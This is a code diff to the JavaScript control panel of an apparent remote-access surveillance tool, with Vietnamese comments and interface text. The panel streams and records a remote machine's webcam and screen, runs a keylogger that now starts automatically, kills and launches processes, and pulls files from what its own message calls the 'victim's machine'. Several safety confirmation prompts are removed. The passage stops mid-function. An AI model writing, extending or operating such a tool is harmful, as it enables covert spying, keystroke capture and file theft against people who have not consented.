@@ -1,4 +1,12 @@
 let isWebcamRecording = false;
+let isScreenRecording = false;
+let isKeylogRunning = false;
+let recHoverTimer = null;
+let webcamAutoStopTimer = null;
+let screenAutoStopTimer = null;
+let currentViewMode = '';
+
+
 
 // --- 1. HIỆU ỨNG THIÊN NHIÊN (Giữ nguyên) ---
 const cloudContainer = document.getElementById('cloudContainer');
@@ -307,14 +315,37 @@ function loadApps() {
 }
 
 function killProc(pid) {
-    if(!confirm(`Dừng PID ${pid}?`)) return;
+    // 1. Bỏ dòng confirm xác nhận
+    // if(!confirm(`Dừng PID ${pid}?`)) return; 
+    
+    // 2. Hiện thông báo đang xử lý
+    showToast(`Đang dừng PID ${pid}...`, "info");
+    
     fetch('/api/kill', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({pid: pid})
-    }).then(res => res.json()).then(data => {
-        logMsg(`Đã dừng PID: ${pid}`);
-        loadApps();
+    })
+    .then(res => res.json())
+    .then(data => {
+        if(data.ok) {
+            // 3. Thông báo thành công
+            showToast(`✅ Đã diệt xong PID: ${pid}`, "success");
+            logMsg(`Đã dừng PID: ${pid}`); // Ghi vào log nhỏ ở dưới nếu có
+            
+            // 4. Tự động làm mới danh sách (Logic cũ giữ nguyên)
+            if (currentViewMode === 'apps') {
+                loadRunningApps(); 
+            } else if (currentViewMode === 'process') {
+                loadInstalledApps(); 
+            }
+        } else {
+            showToast(`❌ Lỗi: Không thể tắt process này`, "error");
+        }
+    })
+    .catch(err => {
+        console.error(err);
+        showToast("❌ Lỗi kết nối API", "error");
     });
 }
 
@@ -371,51 +402,90 @@ function switchMode(mode) {
 }
 
 function renderContent(mode) {
+    currentViewMode = mode;
     const container = document.getElementById('dynamicContent');
     
     if (mode === 'webcam') {
         isWebcamRecording = false; 
         
         container.innerHTML = `
-            <div id="webcamFrame" class="cam-frame" style="height:100%; flex:1; position: relative; overflow: hidden; border-radius: 12px;">
-                <div class="rec-indicator">
-                    <div class="rec-dot"></div> REC
-                </div>
+            <div id="webcamFrame" class="cam-frame">
+                <div class="rec-indicator"><div class="rec-dot"></div> REC</div>
 
                 <div class="top-right-controls">
-                    <button id="btnRecordWebcam" class="icon-btn record-btn" onclick="toggleWebcamRecord()" title="Ghi hình">
-                        <span>⏺️</span> 
-                    </button>
+                    <div class="record-wrapper" id="recWrapperWebcam">
+                        <input type="number" id="recTimeWebcam" class="rec-timer-input" placeholder="s" min="0">
+                        
+                        <button id="btnRecordWebcam" class="icon-btn record-btn" onclick="toggleWebcamRecord()" title="Ghi hình">
+                            <span>⏺️</span> 
+                        </button>
+                    </div>
 
-                    <button class="icon-btn" onclick="downloadSnapshot('webcam')" title="Chụp ảnh nhanh">
+                    <button class="icon-btn" onclick="downloadSnapshot('webcam')" title="Chụp ảnh">
                         📸
                     </button>
                 </div>
 
-                <img src="/video_feed" style="width:100%; height:100%; object-fit:cover;">
-            </div>
-            `;
+                <img src="/video_feed" style="width:100%; height:100%; object-fit:contain;">
+            </div>`;
     }
+
     else if (mode === 'screen') {
+        isScreenRecording = false;
+        
         container.innerHTML = `
-            <div class="cam-frame" style="height:100%; flex:1;">
-                <img src="/screen_feed" style="width:100%; height:100%; object-fit:contain; border-radius:6px;">
+            <div id="screenFrame" class="cam-frame">
+                <div class="rec-indicator"><div class="rec-dot"></div> REC</div>
+
+                <div class="top-right-controls">
+                    <div class="record-wrapper" id="recWrapperScreen">
+                        <input type="number" id="recTimeScreen" class="rec-timer-input" placeholder="s" min="0">
+                        <button id="btnRecordScreen" class="icon-btn record-btn" onclick="toggleScreenRecord()" title="Quay màn hình">
+                            <span>⏺️</span> 
+                        </button>
+                    </div>
+
+                    <button class="icon-btn" onclick="downloadSnapshot('screen')" title="Chụp ảnh">
+                        📸
+                    </button>
+                </div>
+
+                <img src="/screen_feed" style="width:100%; height:100%; object-fit:contain;">
             </div>
-            <div style="text-align:center; color:#93c5fd; margin-top:10px;">🖥️ Đang stream màn hình</div>
-        `;
+            <div style="text-align:center; color:#93c5fd; margin-top:10px;">🖥️ Đang stream màn hình</div>`;
     }
+
     else if (mode === 'keylogger') {
         container.innerHTML = `
             <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
-                <div style="margin-bottom:10px; display:flex; gap:8px; flex-wrap:wrap;">
-                    <button class="btn-nature" onclick="keylogHook()">Bắt đầu Ghi (Hook)</button>
-                    <button class="btn-nature" onclick="keylogUnhook()">Dừng Ghi (Unhook)</button>
-                    <button class="btn-nature" onclick="keylogLoad()">Tải Keylog</button>
+                <div style="margin-bottom:10px; display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
+                    
+                    <button id="btnKeylogToggle" class="btn-nature" onclick="toggleKeylog()">
+                        ▶️ Bắt đầu Ghi
+                    </button>
+
+                    <button class="btn-nature" onclick="keylogLoad()">🔄 Tải dữ liệu</button>
+                    <button class="btn-nature danger" onclick="clearKeylog()">🗑️ Xóa sạch</button>
+                    
+                    <span id="keylogStatus" style="font-size:0.8rem; color:#cbd5e1; margin-left:auto; margin-right: 10px;">Sẵn sàng</span>
                 </div>
-                <textarea id="keylogBox" style="flex:1; width:100%; resize:none; background:rgba(15,23,42,0.9); color:#e5e7eb; border-radius:8px; padding:10px; border:1px solid rgba(148,163,184,0.4); font-family:Consolas,monospace;"></textarea>
+                <textarea id="keylogBox" readonly style="flex:1; width:100%; resize:none; background:rgba(15,23,42,0.9); color:#e5e7eb; border-radius:8px; padding:10px; border:1px solid rgba(148,163,184,0.4); font-family:Consolas,monospace;"></textarea>
             </div>
         `;
+        
+        // 2. LOGIC TỰ ĐỘNG BẬT KHI VÀO
+        if (!isKeylogRunning) {
+            // Nếu chưa chạy -> Bật ngay
+            toggleKeylog();
+        } else {
+            // Nếu đang chạy -> Chỉ cập nhật giao diện nút cho đúng
+            updateKeylogUI();
+        }
+        
+        // Tự động tải dữ liệu cũ lên khung
+        keylogLoad();
     }
+
     else if (mode === 'notify') {
         container.innerHTML = `
             <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
@@ -460,46 +530,90 @@ function renderContent(mode) {
         window._currentPath = "";  // global state
         loadDrives();
     }
-    else if (mode === 'apps') { // Đang chạy + KILL
+    else if (mode === 'apps') { 
         container.innerHTML = `
-            <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
-                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-                    <h3 style="margin:0; color:#86efac;">🔥 Ứng dụng đang chạy</h3>
-                    <button class="btn-nature" onclick="loadRunningApps()">Làm mới</button>
+            <div class="apps-container">
+                <div class="stats-panel">
+                    <h3 style="margin:0; color:#fff; text-align:center; margin-bottom:10px;">📊 Hệ thống</h3>
+                    
+                    <div class="stat-card">
+                        <div class="stat-title">CPU Usage</div>
+                        <div id="chart-cpu" class="chart-circle chart-cpu">
+                            <span class="chart-value" id="val-cpu">0%</span>
+                        </div>
+                        <div class="stat-detail" id="det-cpu">Intel/AMD</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-title">Memory (RAM)</div>
+                        <div id="chart-ram" class="chart-circle chart-ram">
+                            <span class="chart-value" id="val-ram">0%</span>
+                        </div>
+                        <div class="stat-detail" id="det-ram">0 / 0 GB</div>
+                    </div>
+
+                    <div class="stat-card">
+                        <div class="stat-title">Disk (C:)</div>
+                        <div id="chart-disk" class="chart-circle chart-disk">
+                            <span class="chart-value" id="val-disk">0%</span>
+                        </div>
+                        <div class="stat-detail" id="det-disk">0 / 0 GB</div>
+                    </div>
                 </div>
-                <div style="flex:1; overflow-y:auto;">
-                    <table class="nature-table">
-                        <thead>
-                            <tr><th>ID</th><th>Tên</th><th>Threads</th><th></th></tr>
-                        </thead>
-                        <tbody id="appListBody">
-                            <tr><td colspan="4">Đang tải...</td></tr>
-                        </tbody>
-                    </table>
+
+                <div class="apps-table-panel">
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; padding:0 10px;">
+                        <h3 style="margin:0; color:#86efac;">🔥 Ứng dụng đang chạy</h3>
+                        <button class="btn-nature" onclick="loadRunningApps()">🔄 Làm mới</button>
+                    </div>
+                    <div style="flex:1; overflow-y:auto;">
+                        <table class="nature-table">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Tên</th>
+                                    <th>Threads</th>
+                                    <th>Mem</th>
+                                    <th></th>
+                                </tr>
+                            </thead>
+                            <tbody id="appListBody">
+                                <tr><td colspan="5">Đang tải...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
         `;
         loadRunningApps();
     }
-    else if (mode === 'process') {  // Ứng dụng đã cài + START
+
+
+    else if (mode === 'process') {  
+        // Giao diện Processes
         container.innerHTML = `
             <div class="dash-card" style="display:flex; flex-direction:column; height:100%;">
                 <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-                    <h3 style="margin:0; color:#fde68a;">🚀 Ứng dụng đã cài</h3>
-                    <button class="btn-nature" onclick="loadInstalledApps()">Lấy DS Ứng dụng</button>
+                    <h3 style="margin:0; color:#fde68a;">🚀 Quản lý Ứng dụng</h3>
+                    <button class="btn-nature" onclick="loadInstalledApps()">🔄 Làm mới</button>
                 </div>
                 <div style="flex:1; overflow-y:auto;">
                     <table class="nature-table">
                         <thead>
-                            <tr><th>Tên ứng dụng</th><th style="width:120px;"></th></tr>
+                            <tr>
+                                <th>Tên ứng dụng</th>
+                                <th style="width:160px; text-align:right;">Hành động</th>
+                            </tr>
                         </thead>
                         <tbody id="installedBody">
-                            <tr><td colspan="2">Chưa tải.</td></tr>
+                            <tr><td colspan="2" style="text-align:center;">Đang phân tích hệ thống...</td></tr>
                         </tbody>
                     </table>
                 </div>
             </div>
         `;
+        // [QUAN TRỌNG] Gọi hàm tải dữ liệu ngay lập tức
+        loadInstalledApps();
     }
 
     else if (mode === 'custom') {
@@ -509,13 +623,13 @@ function renderContent(mode) {
                 
                 <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap: 20px; width: 100%; max-width: 600px;">
                     
-                    <div class="power-card" onclick="if(confirm('Bạn có chắc muốn khởi động lại Server?')) restartServer()">
+                    <div class="power-card" onclick="restartServer()">
                         <div class="p-icon">🔄</div>
                         <div class="p-title">Khởi động lại</div>
                         <div class="p-desc">Reboot máy chủ Windows</div>
                     </div>
 
-                    <div class="power-card danger" onclick="if(confirm('CẢNH BÁO: Tắt máy sẽ mất kết nối vĩnh viễn! Tiếp tục?')) shutdownServer()">
+                    <div class="power-card danger" onclick="shutdownServer()">
                         <div class="p-icon">🛑</div>
                         <div class="p-title">Tắt nguồn</div>
                         <div class="p-desc">Shutdown máy chủ ngay lập tức</div>
@@ -541,6 +655,57 @@ function renderContent(mode) {
     }
 }
 
+// --- HÀM HIỂN THỊ THÔNG BÁO (TOAST) ---
+function showToast(msg, type = 'success') {
+    // Tạo container nếu chưa có
+    let container = document.getElementById('toast-container');
+    if (!container) {
+        container = document.createElement('div');
+        container.id = 'toast-container';
+        document.body.appendChild(container);
+    }
+
+    // Tạo thẻ thông báo
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    
+    // Chọn icon tương ứng
+    let icon = "✅";
+    if (type === 'error') icon = "❌";
+    if (type === 'info') icon = "ℹ️";
+
+    toast.innerHTML = `<span class="toast-icon">${icon}</span><span class="toast-msg">${msg}</span>`;
+    
+    container.appendChild(toast);
+
+    // Tự động xóa khỏi DOM sau 3.5 giây (khớp với CSS fadeOut)
+    setTimeout(() => {
+        if (toast.parentNode) toast.parentNode.removeChild(toast);
+    }, 3500);
+}
+
+function downloadSnapshot(type) {
+    const url = type === 'webcam' ? '/api/webcam/snapshot' : '/api/screen/snapshot';
+    
+    showToast("📸 Đang chụp ảnh...", "info");
+
+    fetch(url)
+        .then(response => {
+            if (response.ok) {
+                // [THAY ĐỔI]: Bỏ đoạn code tạo thẻ <a> và click() để không hiện cửa sổ lưu
+                // Vì Server Python đã lưu file vào thư mục 'picture' rồi.
+                
+                // Chỉ hiện thông báo thành công
+                showToast(`✅ Đã lưu ảnh vào thư mục 'client/picture'!`, "success");
+            } else {
+                throw new Error("Lỗi Server");
+            }
+        })
+        .catch(err => {
+            showToast("❌ Lỗi: Không thể chụp (Camera/Screen chưa sẵn sàng)", "error");
+        });
+}
+
 
 // ==== KEYLOGGER ====
 function keylogHook() {
@@ -555,15 +720,44 @@ function keylogUnhook() {
             logMsg(res.ok ? "Đã tắt Hook Keylogger." : "Lỗi tắt Hook.");
         }).catch(()=>logMsg("Lỗi API Keylog."));
 }
+
 function keylogLoad() {
+    // Hiển thị thông báo đang tải (dạng info)
+    showToast("Đang tải dữ liệu...", "info");
+
     fetch('/api/keylog/text')
-        .then(r=>r.json())
+        .then(r => r.json())
         .then(data => {
             const box = document.getElementById('keylogBox');
-            if (box) box.value = data.text || "";
-            logMsg("Đã tải keylog.");
+            if (box) {
+                box.value = data.text || "";
+                // Cuộn xuống cuối để xem tin mới nhất
+                box.scrollTop = box.scrollHeight; 
+            }
+            showToast("Đã cập nhật nội dung mới!", "success");
         })
-        .catch(()=>logMsg("Lỗi tải keylog."));
+        .catch(() => showToast("Lỗi tải dữ liệu Keylog.", "error"));
+}
+
+function clearKeylog() {
+    // Không dùng confirm() nữa -> Bấm là xóa ngay
+    
+    fetch('/api/keylog/clear', { method: 'POST' }) 
+    .then(r => r.json())
+    .then(data => {
+        if(data.ok) {
+            // Xóa trắng khung hiển thị ngay lập tức
+            const box = document.getElementById('keylogBox');
+            if(box) box.value = ""; 
+            
+            showToast("Đã xóa sạch lịch sử!", "success");
+        } else {
+            showToast("Lỗi Server: Không xóa được file.", "error");
+        }
+    })
+    .catch(() => {
+        showToast("Lỗi kết nối Server.", "error");
+    });
 }
 
 // ==== NOTIFICATIONS ====
@@ -659,23 +853,84 @@ function openPath(path) {
         window._currentPath = path;
         pathInput.value = path;
         tbody.innerHTML = "";
+        
         if (!list || list.length === 0) {
             tbody.innerHTML = `<tr><td colspan="3">Thư mục trống.</td></tr>`;
             return;
         }
+
         list.forEach(e => {
-            const icon = e.type === "DRIVE" ? "💽 " : e.type === "FOLDER" ? "📁 " : "📄 ";
-            tbody.innerHTML += `
-                <tr onclick="fileRowClick('${e.name.replace(/\\/g,'\\\\')}', '${e.type}')">
-                    <td>${icon}${e.name}</td>
-                    <td>${e.type}</td>
-                    <td>${e.size}</td>
-                </tr>
-            `;
+            let rowHtml = "";
+            
+            if (e.type === "FILE") {
+                // --- XỬ LÝ FILE: HIỆN NÚT DOWNLOAD ---
+                
+                // Xử lý đường dẫn đầy đủ (nối path hiện tại + tên file)
+                // Lưu ý: encode tên file để tránh lỗi nháy đơn/kép
+                const safeName = e.name.replace(/'/g, "\\'"); 
+                let fullPath = (path.endsWith('\\') ? path : path + '\\') + e.name;
+                
+                // Escape dấu \ để truyền vào hàm JS không bị lỗi
+                const jsPath = fullPath.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+
+                rowHtml = `
+                    <tr>
+                        <td>📄 ${e.name}</td>
+                        <td>${e.type}</td>
+                        <td style="display:flex; justify-content:space-between; align-items:center;">
+                            <span>${e.size}</span>
+                            <button class="btn-nature" style="padding:4px 10px; font-size:0.8rem;" 
+                                onclick="downloadFile('${jsPath}')">
+                                ⬇ Tải
+                            </button>
+                        </td>
+                    </tr>
+                `;
+            } else {
+                // --- XỬ LÝ FOLDER/DRIVE: CLICK ĐỂ MỞ ---
+                const icon = e.type === "DRIVE" ? "💽 " : "📁 ";
+                const safeName = e.name.replace(/\\/g,'\\\\').replace(/'/g, "\\'");
+                
+                rowHtml = `
+                    <tr onclick="fileRowClick('${safeName}', '${e.type}')" style="cursor:pointer;">
+                        <td>${icon}${e.name}</td>
+                        <td>${e.type}</td>
+                        <td></td>
+                    </tr>
+                `;
+            }
+            tbody.innerHTML += rowHtml;
         });
     })
     .catch(()=> {
         tbody.innerHTML = `<tr><td colspan="3" style="color:#fca5a5;">Lỗi API.</td></tr>`;
+    });
+}
+
+function downloadFile(fullPath) {
+    // 1. Bỏ confirm -> Bấm là chạy luôn
+    
+    showToast(`Đang kéo file từ máy nạn nhân...`, "info");
+    
+    fetch('/api/files/download', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({path: fullPath})
+    })
+    .then(r => r.json())
+    .then(data => {
+        if(data.ok) {
+            // 2. Chỉ hiện thông báo, KHÔNG tạo link tải về trình duyệt nữa
+            // Vì file đã nằm sẵn trong folder 'client/downloads' của bạn rồi
+            showToast(`✅ Tải xong! File đã lưu tại: /downloads/${data.file}`, "success");
+            logMsg(`Đã tải file: ${data.file}`);
+        } else {
+            showToast("❌ Lỗi: " + (data.error || "File rỗng hoặc không quyền"), "error");
+        }
+    })
+    .catch(e => {
+        console.error(e);
+        showToast("❌ Lỗi kết nối API", "error");
     });
 }
 
@@ -697,63 +952,143 @@ function goBackPath() {
 
 // ==== RUNNING APPS (Apps block) ====
 function loadRunningApps() {
+    // 1. Tải danh sách Apps (Code cũ, nhưng bỏ render cột CPU)
     const tbody = document.getElementById('appListBody');
-    if (!tbody) return;
-    tbody.innerHTML = `<tr><td colspan="4">Đang tải...</td></tr>`;
-    fetch('/api/list_apps')
-        .then(r=>r.json())
-        .then(list => {
-            tbody.innerHTML = "";
-            if (!list || list.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="4">Trống.</td></tr>`;
-                return;
-            }
-            list.forEach(p => {
-                tbody.innerHTML += `
-                    <tr>
-                        <td>${p.id}</td>
-                        <td>${p.name}</td>
-                        <td>${p.threads}</td>
-                        <td style="text-align:right;">
-                            <button class="btn-nature danger" onclick="killProc('${p.id}')">KILL</button>
-                        </td>
-                    </tr>
-                `;
-            });
+    if (tbody) {
+        tbody.innerHTML = `<tr><td colspan="5">⏳ Đang tải dữ liệu...</td></tr>`;
+        fetch('/api/list_apps')
+            .then(r=>r.json())
+            .then(list => {
+                tbody.innerHTML = "";
+                if (!list || list.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="5">Trống.</td></tr>`; return;
+                }
+                list.forEach(p => {
+                    tbody.innerHTML += `
+                        <tr>
+                            <td>${p.id}</td>
+                            <td style="font-weight:bold; color:#e2e8f0; max-width:150px; overflow:hidden; text-overflow:ellipsis;">${p.name}</td>
+                            <td>${p.threads}</td>
+                            <td style="color:#fde68a;">${p.memory}</td>
+                            <td style="text-align:right;">
+                                <button class="btn-nature danger" style="padding:4px 10px; font-size:0.75rem;" onclick="killProc('${p.id}')">KILL</button>
+                            </td>
+                        </tr>`;
+                });
+            })
+            .catch(()=> { tbody.innerHTML = `<tr><td colspan="5" style="color:#fca5a5;">Lỗi API Apps.</td></tr>`; });
+    }
+
+    // 2. Tải thông số Hệ thống (Cập nhật thêm text chi tiết)
+    fetch('/api/stats')
+        .then(r => r.json())
+        .then(stats => {
+            // Cập nhật biểu đồ (%)
+            updateChart('cpu', stats.cpu, '#ef4444');
+            updateChart('ram', stats.ram_p, '#f59e0b');
+            updateChart('disk', stats.disk_p, '#10b981');
+
+            // Cập nhật text chi tiết (GB)
+            setText('det-cpu', stats.cpu + "% Load");
+            setText('det-ram', `${stats.ram_u} / ${stats.ram_t} GB`);
+            setText('det-disk', `${stats.disk_u} / ${stats.disk_t} GB`);
         })
-        .catch(()=> {
-            tbody.innerHTML = `<tr><td colspan="4" style="color:#fca5a5;">Lỗi API.</td></tr>`;
-        });
+        .catch(e => console.log("Lỗi Stats:", e));
 }
 
-// ==== INSTALLED APPS (Processes block) ====
+function setText(id, txt) {
+    const el = document.getElementById(id);
+    if(el) el.innerText = txt;
+}
+
+// Hàm vẽ lại biểu đồ tròn
+function updateChart(type, value, color) {
+    const chart = document.getElementById(`chart-${type}`);
+    const valText = document.getElementById(`val-${type}`);
+    if (chart && valText) {
+        valText.innerText = value + "%";
+        // Cập nhật background gradient
+        chart.style.background = `conic-gradient(${color} ${value}%, rgba(255,255,255,0.1) ${value}%)`;
+    }
+}
+
+// ==== INSTALLED APPS (XỬ LÝ THÔNG MINH START/KILL) ====
 function loadInstalledApps() {
     const tbody = document.getElementById('installedBody');
     if (!tbody) return;
-    tbody.innerHTML = `<tr><td colspan="2">Đang tải...</td></tr>`;
-    fetch('/api/apps/installed')
-        .then(r=>r.json())
-        .then(list => {
-            tbody.innerHTML = "";
-            if (!list || list.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="2">Không có dữ liệu.</td></tr>`;
-                return;
-            }
-            list.forEach(a => {
-                const name = a.name;
-                tbody.innerHTML += `
-                    <tr>
-                        <td>${name}</td>
-                        <td style="text-align:right;">
-                            <button class="btn-nature" onclick="startInstalledApp('${name.replace(/'/g,"\\'")}')">START</button>
-                        </td>
-                    </tr>
-                `;
-            });
-        })
-        .catch(()=> {
-            tbody.innerHTML = `<tr><td colspan="2" style="color:#fca5a5;">Lỗi API.</td></tr>`;
+    
+    tbody.innerHTML = `<tr><td colspan="2" style="text-align:center;">⏳ Đang đối chiếu dữ liệu...</td></tr>`;
+
+    // Gọi song song 2 API để lấy dữ liệu
+    Promise.all([
+        fetch('/api/apps/installed').then(r => r.json()), // List A: Đã cài
+        fetch('/api/list_apps').then(r => r.json())       // List B: Đang chạy (có PID)
+    ])
+    .then(([installedList, runningList]) => {
+        tbody.innerHTML = "";
+        
+        if (!installedList || installedList.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="2">Không tìm thấy ứng dụng nào.</td></tr>`;
+            return;
+        }
+
+        // Tạo Map cho danh sách đang chạy để tìm kiếm nhanh hơn
+        // Key: Tên process (chữ thường), Value: PID
+        const runningMap = {};
+        runningList.forEach(proc => {
+            if (proc.name) runningMap[proc.name.toLowerCase()] = proc.id;
         });
+
+        installedList.forEach(app => {
+            const appName = app.name; 
+            const searchName = appName.toLowerCase();
+            
+            // LOGIC SO SÁNH:
+            // Tìm xem tên App đã cài có xuất hiện trong danh sách process đang chạy không
+            // (So sánh tương đối: contains)
+            let isRunning = false;
+            let targetPid = null;
+
+            for (const [procName, pid] of Object.entries(runningMap)) {
+                // Nếu tên process chứa tên app hoặc ngược lại
+                if (procName.includes(searchName) || searchName.includes(procName)) {
+                    isRunning = true;
+                    targetPid = pid;
+                    break; 
+                }
+            }
+
+            // Xử lý trạng thái nút
+            // Class 'disabled' sẽ làm nút mờ đi và không bấm được (nhờ CSS ở bước 1)
+            const startClass = isRunning ? "btn-nature disabled" : "btn-nature";
+            const killClass  = isRunning ? "btn-nature danger" : "btn-nature danger disabled";
+            
+            // Xử lý hành động onclick
+            // Start: Gửi tên app
+            // Kill: Gửi PID tìm được (nếu có)
+            const startAction = `startInstalledApp('${appName.replace(/'/g,"\\'")}')`;
+            const killAction  = targetPid ? `killProc('${targetPid}')` : "";
+
+            tbody.innerHTML += `
+                <tr>
+                    <td>
+                        <span style="${isRunning ? 'color:#86efac; font-weight:bold;' : ''}">
+                            ${appName}
+                        </span>
+                        ${isRunning ? '<small style="color:#cbd5e1; margin-left:5px;">(Đang chạy)</small>' : ''}
+                    </td>
+                    <td style="text-align:right; white-space:nowrap;">
+                        <button class="${startClass}" onclick="${startAction}" style="margin-right:5px;">▶ START</button>
+                        <button class="${killClass}" onclick="${killAction}">💀 KILL</button>
+                    </td>
+                </tr>
+            `;
+        });
+    })
+    .catch(err => {
+        console.error(err);
+        tbody.innerHTML = `<tr><td colspan="2" style="color:#fca5a5; text-align:center;">Lỗi kết nối API.</td></tr>`;
+    });
 }
 
 function startInstalledApp(name) {
@@ -764,12 +1099,31 @@ function startInstalledApp(name) {
     })
     .then(r=>r.json())
     .then(res => {
-        logMsg(res.ok ? `Đã gửi lệnh mở: ${name}` : `Lỗi mở: ${name}`);
+        if(res.ok) {
+            logMsg(`Đã gửi lệnh mở: ${name}`);
+            showToast(`Đang khởi động ${name}...`, "info");
+            
+            // [MỚI] Chờ 1.5 giây cho App kịp chạy lên, rồi refresh lại danh sách
+            // Để nút START mờ đi, nút KILL sáng lên
+            setTimeout(() => {
+                if (currentViewMode === 'process') {
+                    loadInstalledApps();
+                }
+            }, 1500);
+        } else {
+            logMsg(`Lỗi mở: ${name}`);
+            showToast("Không thể khởi động ứng dụng", "error");
+        }
     })
     .catch(()=>logMsg("Lỗi API StartProcess."));
 }
 
 function shutdownServer() {
+    // Hỏi xác nhận trước
+    if(!confirm('CẢNH BÁO: Bạn sắp kích hoạt thiên thạch hủy diệt để TẮT MÁY CHỦ.\nHành động này sẽ ngắt kết nối vĩnh viễn.\nTiếp tục?')) return;
+
+    showToast("☄️ Đã phóng thiên thạch...", "info");
+
     fetch('/api/power', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -778,18 +1132,27 @@ function shutdownServer() {
     .then(res => res.json())
     .then(data => {
         if (data.ok) {
-            alert('Máy chủ đang tắt...');
+            // Hiệu ứng thiên thạch rơi -> Sau đó tự logout
+            triggerApocalypse(() => {
+                logout(); // Logout sau cú va chạm
+            });
         } else {
-            alert('Không thể tắt máy.');
+            showToast("❌ Lỗi: Server từ chối tắt máy.", "error");
         }
     })
     .catch(err => {
-        console.error(err);
-        alert('Lỗi kết nối khi shutdown.');
+        // Vẫn cho chạy hiệu ứng kể cả khi mất kết nối (vì tắt máy là mất kết nối mà)
+        triggerMeteorEffect(() => {
+             setTimeout(logout, 500);
+        });
     });
 }
 
 function restartServer() {
+    if(!confirm('Bạn muốn triệu hồi thiên thạch để KHỞI ĐỘNG LẠI máy chủ?')) return;
+
+    showToast("☄️ Thiên thạch tái sinh đang đến...", "info");
+
     fetch('/api/power', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
@@ -798,17 +1161,19 @@ function restartServer() {
     .then(res => res.json())
     .then(data => {
         if (data.ok) {
-            alert('Máy chủ đang khởi động lại...');
+            triggerApocalypse(() => {
+                logout();
+            });
         } else {
-            alert('Không thể restart máy.');
+            showToast("❌ Lỗi: Không thể restart.", "error");
         }
     })
     .catch(err => {
-        console.error(err);
-        alert('Lỗi kết nối khi restart.');
+        triggerMeteorEffect(() => {
+             setTimeout(logout, 500);
+        });
     });
 }
-
 // ============================================================
 // 4. WEATHER MANAGER (QUẢN LÝ THỜI TIẾT TẬP TRUNG)
 // ============================================================
@@ -1176,43 +1541,348 @@ function scheduleNextWeather() {
 function toggleWebcamRecord() {
     const btn = document.getElementById('btnRecordWebcam');
     const frame = document.getElementById('webcamFrame');
+    const input = document.getElementById('recTimeWebcam');
+    const wrapper = document.getElementById('recWrapperWebcam');
 
     if (!isWebcamRecording) {
-        // --- BẮT ĐẦU GHI ---
-        // (Bỏ confirm nếu muốn bấm là quay luôn)
-        // if(!confirm("Bắt đầu ghi hình Webcam?")) return; 
+        // --- BẮT ĐẦU ---
+        
+        // 1. Lấy thời gian từ ô input (nếu có)
+        let duration = 0;
+        if (input && input.value) {
+            duration = parseInt(input.value);
+        }
 
-        // Chỉ cần thêm class, CSS sẽ tự đổi icon và màu sắc
+        // 2. Cập nhật giao diện
         btn.classList.add('recording'); 
-        frame.classList.add('recording'); // Hiện chữ REC góc trái
+        frame.classList.add('recording');
         isWebcamRecording = true;
+        
+        // Ẩn ô input đi cho gọn
+        if(wrapper) wrapper.classList.remove('show-input');
 
-        fetch('/api/webcam/record/start')
-            .then(r => { if(!r.ok) stopUI(); })
-            .catch(e => { stopUI(); });
+        // 3. Gửi lệnh Start kèm duration (POST)
+        fetch('/api/webcam/record/start', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ duration: duration })
+        })
+        .then(r => r.json())
+        .then(res => {
+            if(!res.ok) stopUI();
+            else {
+                // Nếu có hẹn giờ -> JS tự đếm ngược để tắt UI
+                if (duration > 0) {
+                    console.log(`Hẹn giờ tắt sau ${duration}s`);
+                    webcamAutoStopTimer = setTimeout(() => {
+                        toggleWebcamRecord(); // Gọi lại hàm để kích hoạt nhánh Dừng
+                        showToast("Đã dừng ghi hình (Hết giờ)", "info");
+                    }, duration * 1000);
+                }
+            }
+        })
+        .catch(() => stopUI());
 
     } else {
-        // --- DỪNG GHI ---
+        // --- DỪNG ---
         stopUI();
-        fetch('/api/webcam/record/stop')
-            .then(r => r.text())
-            .then(msg => {
-                 // Có thể hiện thông báo nhỏ thay vì alert để đỡ phiền
-                 console.log("Đã lưu video.");
-            });
+        // Xóa timer hẹn giờ (nếu người dùng bấm dừng sớm)
+        if (webcamAutoStopTimer) clearTimeout(webcamAutoStopTimer);
+
+        fetch('/api/webcam/record/stop').then(() => {
+             showToast("Video đã được lưu!", "success");
+        });
     }
 
     function stopUI() {
-        // Gỡ class, nút tự về trạng thái ban đầu
         btn.classList.remove('recording');
         frame.classList.remove('recording');
         isWebcamRecording = false;
+        if(input) input.value = ""; // Reset ô nhập
     }
 }
 
 
+// --- LOGIC QUAY MÀN HÌNH (SCREEN RECORD) ---
+function toggleScreenRecord() {
+    const btn = document.getElementById('btnRecordScreen');
+    const frame = document.getElementById('screenFrame');
+    const input = document.getElementById('recTimeScreen');
+    const wrapper = document.getElementById('recWrapperScreen');
 
+    if (!isScreenRecording) {
+        // --- BẮT ĐẦU GHI ---
+        
+        // 1. Lấy thời gian hẹn giờ (nếu có)
+        let duration = 0;
+        if (input && input.value) {
+            duration = parseInt(input.value);
+        }
+
+        // 2. Cập nhật giao diện ngay lập tức
+        btn.classList.add('recording'); 
+        frame.classList.add('recording');
+        isScreenRecording = true;
+        
+        // Ẩn ô input đi cho gọn
+        if(wrapper) wrapper.classList.remove('show-input');
+
+        // 3. Gọi API Start với method POST
+        fetch('/api/screen/record/start', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ duration: duration })
+        })
+        .then(r => r.json())
+        .then(res => {
+            if(!res.ok) {
+                stopUI(); // Lỗi thì tắt UI
